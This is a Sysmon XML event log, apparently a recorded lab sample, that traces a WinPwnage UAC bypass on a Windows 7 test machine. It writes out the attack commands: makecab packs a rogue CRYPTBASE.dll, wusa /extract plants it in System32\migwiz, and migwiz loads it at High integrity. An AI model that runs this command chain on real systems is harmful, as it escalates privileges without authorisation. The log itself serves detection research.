<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:10.125532700Z" />
      <EventRecordID>15969</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 16:46:10.125</Data>
      <Data Name="ProcessGuid">{365ABB72-FC52-5CD6-0000-0010357F1200}</Data>
      <Data Name="ProcessId">3812</Data>
      <Data Name="Image">C:\Python27\python.exe</Data>
      <Data Name="FileVersion">?</Data>
      <Data Name="Description">?</Data>
      <Data Name="Product">?</Data>
      <Data Name="Company">?</Data>
      <Data Name="CommandLine">python  winpwnage.py -u uac -i 13 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-F9CD-5CD6-0000-002065370100}</Data>
      <Data Name="LogonId">0x13765</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5</Data>
      <Data Name="ParentProcessGuid">{365ABB72-FAB8-5CD6-0000-0010DA8F0A00}</Data>
      <Data Name="ParentProcessId">300</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:10.344282700Z" />
      <EventRecordID>15970</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 16:46:10.344</Data>
      <Data Name="ProcessGuid">{365ABB72-FC52-5CD6-0000-0010357F1200}</Data>
      <Data Name="ProcessId">3812</Data>
      <Data Name="Image">c:\python27\python.exe</Data>
      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\CRYPTBASE.dll</Data>
      <Data Name="CreationUtcTime">2019-05-11 16:46:10.344</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:15.500532700Z" />
      <EventRecordID>15971</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 16:46:15.406</Data>
      <Data Name="ProcessGuid">{365ABB72-FC57-5CD6-0000-00101FAF1200}</Data>
      <Data Name="ProcessId">3884</Data>
      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Microsoft« Cabinet Maker</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\makecab.exe" c:\users\ieuser\appdata\local\temp\CRYPTBASE.dll c:\users\ieuser\appdata\local\temp\suspicious.cab</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-F9CD-5CD6-0000-002065370100}</Data>
      <Data Name="LogonId">0x13765</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5</Data>
      <Data Name="ParentProcessGuid">{365ABB72-FC52-5CD6-0000-0010357F1200}</Data>
      <Data Name="ParentProcessId">3812</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 13 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:15.547407700Z" />
      <EventRecordID>15972</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 16:46:15.484</Data>
      <Data Name="ProcessGuid">{365ABB72-FC57-5CD6-0000-00101FAF1200}</Data>
      <Data Name="ProcessId">3884</Data>
      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\suspicious.cab</Data>
      <Data Name="CreationUtcTime">2019-05-11 16:46:15.484</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:20.531782700Z" />
      <EventRecordID>15973</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 16:46:20.422</Data>
      <Data Name="ProcessGuid">{365ABB72-FC5C-5CD6-0000-001045DB1200}</Data>
      <Data Name="ProcessId">3756</Data>
      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Windows Update Standalone Installer</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32\migwiz /quiet</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-F9CD-5CD6-0000-002065370100}</Data>
      <Data Name="LogonId">0x13765</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
      <Data Name="ParentProcessGuid">{365ABB72-FC52-5CD6-0000-0010357F1200}</Data>
      <Data Name="ParentProcessId">3812</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 13 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:20.828657700Z" />
      <EventRecordID>15974</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 16:46:20.688</Data>
      <Data Name="ProcessGuid">{365ABB72-FC5C-5CD6-0000-0010E9F61200}</Data>
      <Data Name="ProcessId">1256</Data>
      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Windows Update Standalone Installer</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32\migwiz /quiet</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-F9CD-5CD6-0000-00201B370100}</Data>
      <Data Name="LogonId">0x1371b</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
      <Data Name="ParentProcessGuid">{365ABB72-FC52-5CD6-0000-0010357F1200}</Data>
      <Data Name="ParentProcessId">3812</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 13 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>7</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>7</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T16:46:26.203657700Z" />
      <EventRecordID>15975</EventRecordID>
      <Correlation />
      <Execution ProcessID="2008" ThreadID="1992" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">Possible UAC Bypass - mcx2prov DLL</Data>
      <Data Name="UtcTime">2019-05-11 16:46:26.000</Data>
      <Data Name="ProcessGuid">{365ABB72-FC61-5CD6-0000-0010141A1300}</Data>
      <Data Name="ProcessId">3240</Data>
      <Data Name="Image">C:\Windows\System32\migwiz\migwiz.exe</Data>
      <Data Name="ImageLoaded">C:\Windows\System32\migwiz\CRYPTBASE.dll</Data>
      <Data Name="FileVersion">?</Data>
      <Data Name="Description">?</Data>
      <Data Name="Product">?</Data>
      <Data Name="Company">?</Data>
      <Data Name="Hashes">SHA1=AA3BF7118AE8138859FC0EE9202684C6DA22C176,MD5=3F090AA1CAE8B179F93B2064B8609AE2,SHA256=AC1DD32C41F6002BDF2EB564653FF23E069594CE55F9E22093355084EE28A6FD,IMPHASH=10D8CBCC4D9E244D697F1C09224856DC</Data>
      <Data Name="Signed">false</Data>
      <Data Name="Signature">
      </Data>
      <Data Name="SignatureStatus">Unavailable</Data>
    </EventData>
  </Event>
</root>